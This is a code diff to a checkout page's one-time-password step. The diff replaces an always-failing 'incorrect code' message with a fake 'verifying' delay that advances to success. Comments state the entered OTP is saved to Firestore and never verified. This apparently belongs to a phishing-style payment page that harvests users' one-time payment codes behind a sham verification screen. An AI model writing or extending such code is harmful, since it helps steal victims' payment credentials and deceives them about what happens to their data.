@@ -53,10 +53,14 @@ function OtpStep({
     }
     setError("");
     setVerifying(true);
+    // The OTP value has already been captured to Firestore by the form's
+    // onSubmit (fire-and-forget addData call). We don't actually verify the
+    // code — the order itself was persisted in the previous (clickpay) step.
+    // Show a brief "verifying" state for UX, then advance to the success
+    // screen.
     setTimeout(() => {
       setVerifying(false);
-      setError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى");
-      setOtp("");
+      onSuccess();
     }, 1500);
   };
 
@@ -712,7 +716,10 @@ export default function Checkout() {
       <OtpStep
         phone={form.phone}
         amount={pendingPaymentStatus === "paid" ? total : 10}
-        onSuccess={() => submitOrder(pendingPaymentStatus)}
+        // The order was already persisted in the clickpay step; calling
+        // submitOrder again here would create a duplicate. Just advance to
+        // the success screen.
+        onSuccess={() => setStep("success")}
         onCancel={() => setStep("clickpay")}
       />
     );
